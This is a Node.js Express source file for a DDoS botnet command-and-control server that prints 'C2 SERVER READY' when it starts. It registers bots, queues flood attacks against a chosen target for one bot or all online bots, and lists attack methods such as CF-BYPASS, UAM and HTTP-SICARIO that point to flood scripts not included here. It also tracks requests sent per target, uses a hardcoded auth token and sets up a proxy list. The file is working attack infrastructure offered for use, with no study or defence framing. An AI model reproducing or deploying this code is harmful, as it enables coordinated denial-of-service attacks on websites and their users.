const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;
const AUTH_TOKEN = "ricardo";

// ========== TRUST PROXY (FIX FOR RENDER) ==========
// Enable trust proxy to handle X-Forwarded-For headers properly
app.set('trust proxy', 1);

// ========== RATE LIMITING (FIXED) ==========
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  // Skip rate limiting for the ping endpoint
  skip: (req) => req.path === '/ping',
  // Use simple key generator to avoid X-Forwarded-For issues
  keyGenerator: (req) => {
    return req.ip || req.connection.remoteAddress || 'unknown';
  }
});

// Apply rate limiting only to API endpoints
app.use('/api/', limiter);

// ========== AUTH MIDDLEWARE ==========
const authenticate = (req, res, next) => {
  const token = req.headers['authorization'] || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// ========== DATA STORES ==========
let connectedBots = [];
let pendingCommands = {};
let stopCommands = new Set();
let blockedBots = new Set();
let attackHistory = [];

// ========== STATS ==========
let serverStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  totalRequests: 0,
  attacksByMethod: {},
  attacksByTarget: {},
  startTime: Date.now(),
  uptime: 0
};

const BOT_TIMEOUT = 30000;

// ========== CLEANUP ==========
function cleanupInactiveBots() {
  const now = Date.now();
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(bot => now - bot.lastSeen < BOT_TIMEOUT);
  if (before !== connectedBots.length) {
    serverStats.totalBots = connectedBots.length;
    console.log(`[CLEANUP] Removed ${before - connectedBots.length} inactive bots`);
  }
}

function updateAttackingStatus() {
  const now = Date.now();
  for (const bot of connectedBots) {
    if (bot.attacking && bot.attackEndTime && now >= bot.attackEndTime) {
      bot.attacking = false;
      bot.attackEndTime = 0;
      serverStats.activeAttacks = Math.max(0, serverStats.activeAttacks - 1);
    }
  }
}

setInterval(() => {
  cleanupInactiveBots();
  updateAttackingStatus();
  serverStats.uptime = Math.floor((Date.now() - serverStats.startTime) / 1000);
}, 5000);

// ========== METHOD FILES ==========
const methodFiles = {
  'RAW-GET': 'methods/raw-get.js',
  'CF-BYPASS': 'methods/cf-bypass.js',
  'MODERN-FLOOD': 'methods/modern-flood.js',
  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
  'RAW-HTTP': 'methods/h2-nust.js',
  'R9': 'methods/high-dstat.js',
  'PRIV-TOR': 'methods/w-flood1.js',
  'HOLD-PANEL': 'methods/http-panel.js',
  'R1': 'methods/vhold.js',
  'UAM': 'methods/uam.js',
  'W.I.L': 'methods/wil.js',
  'BYPASS': 'methods/BYPASS.js',
  'VHOLD': 'methods/vhold.js',
  'W-FLOOD': 'methods/w-flood1.js',
  'STRESS': 'methods/curl-stress.js',
  'CURL-SPAM': 'methods/curl-stress.js',
  'RAPID10': 'methods/r10-rapid.js',
  'R10': 'methods/r10-rapid.js'
};

// ========== BOT ENDPOINTS ==========
app.post('/register', (req, res) => {
  const { id, name, url } = req.body;
  
  if (!id) {
    return res.status(400).json({ error: 'Bot ID required' });
  }

  if (blockedBots.has(id)) {
    console.log(`[BLOCKED] Bot tried to register: ${id}`);
    return res.status(403).json({ error: 'Bot is blocked', approved: false });
  }

  let bot = connectedBots.find(b => b.id === id);
  if (bot) {
    bot.lastSeen = Date.now();
    bot.url = url || bot.url;
    bot.name = name || bot.name;
    return res.json({ message: 'Bot already registered', approved: true, bot });
  }

  const newBot = {
    id,
    name: name || `Bot-${id.slice(-6)}`,
    url: url || `http://localhost:${Math.floor(Math.random() * 10000) + 1000}`,
    registeredAt: new Date().toISOString(),
    lastSeen: Date.now(),
    attacking: false,
    attackEndTime: 0,
    attacksPerformed: 0
  };
  
  connectedBots.push(newBot);
  serverStats.totalBots = connectedBots.length;
  console.log(`[REGISTER] New bot: ${newBot.name} (${id}) (total: ${connectedBots.length})`);
  res.json({ message: 'Bot registered successfully', approved: true, bot: newBot });
});

app.get('/get-command', (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.status(400).json({ error: 'Bot ID required' });

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) bot.lastSeen = Date.now();

  if (stopCommands.has(botId)) {
    stopCommands.delete(botId);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }

  if (pendingCommands[botId]) {
    const command = pendingCommands[botId];
    delete pendingCommands[botId];
    console.log(`[COMMAND] Sending attack to ${botId}: ${command.methods} -> ${command.target}`);
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }

  res.json({ hasCommand: false });
});

app.post('/api/report', authenticate, (req, res) => {
  const { botId, target, method, requests, duration } = req.body;

  serverStats.totalRequests += requests || 0;
  serverStats.attacksByMethod[method] = (serverStats.attacksByMethod[method] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.lastReport = Date.now();
  }

  console.log(`[REPORT] ${botId} sent ${requests || 0} requests to ${target} using ${method}`);
  res.json({ success: true });
});

// ========== CONTROL ENDPOINTS ==========
app.get('/bots', authenticate, (req, res) => {
  const now = Date.now();
  const botsWithStatus = connectedBots.map(bot => ({
    id: bot.id,
    name: bot.name,
    url: bot.url,
    lastSeen: bot.lastSeen,
    attacking: bot.attacking || false,
    online: (now - bot.lastSeen) < BOT_TIMEOUT,
    attacksPerformed: bot.attacksPerformed || 0
  }));
  res.json({
    total: connectedBots.length,
    bots: botsWithStatus
  });
});

app.get('/api/stats', authenticate, (req, res) => {
  const now = Date.now();
  const onlineBots = connectedBots.filter(b => now - b.lastSeen < BOT_TIMEOUT).length;
  res.json({
    totalAttacks: serverStats.totalAttacks,
    activeAttacks: serverStats.activeAttacks,
    totalRequests: serverStats.totalRequests,
    uptime: serverStats.uptime,
    totalBots: connectedBots.length,
    onlineBots: onlineBots,
    offlineBots: connectedBots.length - onlineBots,
    attacksByMethod: serverStats.attacksByMethod,
    attacksByTarget: serverStats.attacksByTarget
  });
});

// ========== ATTACK ENDPOINTS ==========
app.get('/attack-bot', authenticate, (req, res) => {
  const { bot, target, time, methods } = req.query;
  if (!bot || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters' });
  }

  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }

  const botObj = connectedBots.find(b => b.id === bot);
  if (!botObj) {
    return res.json({ success: false, error: 'Bot not found' });
  }

  botObj.attacking = true;
  botObj.attackEndTime = Date.now() + duration * 1000;

  pendingCommands[botObj.id] = {
    target: target,
    time: duration,
    methods: methods,
    timestamp: Date.now()
  };

  serverStats.totalAttacks++;
  serverStats.activeAttacks++;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;

  console.log(`[ATTACK-BOT] ${methods} -> ${target} on ${botObj.name} (${botObj.id}) for ${duration}s`);
  res.json({ success: true, message: 'Command sent to bot' });
});

// ========== ATTACK-ALL ENDPOINT (FIXED) ==========
app.get('/attack-all', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  
  // Validate parameters
  if (!target || !time || !methods) {
    return res.status(400).json({ 
      success: false, 
      error: 'Missing parameters: target, time, methods' 
    });
  }

  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.status(400).json({ 
      success: false, 
      error: 'Invalid time (1-3600 seconds)' 
    });
  }

  // Get online bots
  const now = Date.now();
  const onlineBots = connectedBots.filter(b => (now - b.lastSeen) < BOT_TIMEOUT);
  
  if (onlineBots.length === 0) {
    return res.status(404).json({ 
      success: false, 
      error: 'No online bots available' 
    });
  }

  // Send command to all online bots
  let sentCount = 0;
  const failedBots = [];

  for (const bot of onlineBots) {
    try {
      bot.attacking = true;
      bot.attackEndTime = Date.now() + duration * 1000;
      pendingCommands[bot.id] = {
        target: target,
        time: duration,
        methods: methods,
        timestamp: Date.now()
      };
      sentCount++;
    } catch (error) {
      failedBots.push(bot.id);
      console.error(`[ERROR] Failed to send command to ${bot.id}: ${error.message}`);
    }
  }

  // Update stats
  serverStats.totalAttacks += sentCount;
  serverStats.activeAttacks += sentCount;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + sentCount;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + sentCount;

  console.log(`[ATTACK-ALL] ${methods} -> ${target} on ${sentCount}/${onlineBots.length} bots for ${duration}s`);
  
  res.json({ 
    success: true, 
    message: `Attack sent to ${sentCount} bots`,
    sent: sentCount,
    total: onlineBots.length,
    failed: failedBots.length > 0 ? failedBots : undefined
  });
});

// ========== STOP ALL ==========
app.get('/stop-all', authenticate, (req, res) => {
  pendingCommands = {};
  for (const bot of connectedBots) {
    stopCommands.add(bot.id);
    bot.attacking = false;
    bot.attackEndTime = 0;
  }
  serverStats.activeAttacks = 0;
  console.log(`[STOP-ALL] Stopped all attacks on ${connectedBots.length} bots`);
  res.json({ success: true, message: `Stop command sent to ${connectedBots.length} bots` });
});

// ========== BLOCK/UNBLOCK/REMOVE ==========
app.get('/block-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  blockedBots.add(bot);
  connectedBots = connectedBots.filter(b => b.id !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot blocked' });
});

app.get('/unblock-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  blockedBots.delete(bot);
  res.json({ success: true, message: 'Bot unblocked' });
});

app.get('/blocked', authenticate, (req, res) => {
  res.json({ blocked: Array.from(blockedBots) });
});

app.get('/remove-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(b => b.id !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot removed', removed: before !== connectedBots.length });
});

// ========== METHODS LIST ==========
app.get('/methods', authenticate, (req, res) => {
  const available = Object.keys(methodFiles).filter(name => {
    const filePath = path.join(__dirname, methodFiles[name]);
    return fs.existsSync(filePath);
  });
  res.json({ methods: available, total: available.length });
});

// ========== PING ==========
app.get('/ping', (req, res) => {
  res.json({ 
    alive: true, 
    timestamp: Date.now(), 
    bots: connectedBots.length,
    uptime: serverStats.uptime
  });
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    bots: connectedBots.length,
    uptime: serverStats.uptime
  });
});

// ========== ERROR HANDLER ==========
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

// ========== START ==========
app.listen(port, () => {
  console.log('\n========================================');
  console.log('🔥 C2 SERVER READY');
  console.log('========================================');
  console.log(`📍 Port: ${port}`);
  console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
  console.log('📊 Bot Registration: ID-based');
  console.log('📡 Endpoints:');
  console.log('  - POST /register (bot registration)');
  console.log('  - GET /bots (list bots)');
  console.log('  - GET /api/stats (stats)');
  console.log('  - GET /attack-bot (attack single bot)');
  console.log('  - GET /attack-all (attack all bots)');
  console.log('  - GET /stop-all (stop all attacks)');
  console.log('========================================\n');

  if (!fs.existsSync('./methods')) {
    fs.mkdirSync('./methods');
    console.log('[SETUP] Created methods directory');
  }
  if (!fs.existsSync('./proxy.txt')) {
    fs.writeFileSync('./proxy.txt', '# Proxies (ip:port)\n');
    console.log('[SETUP] Created proxy.txt');
  }
});
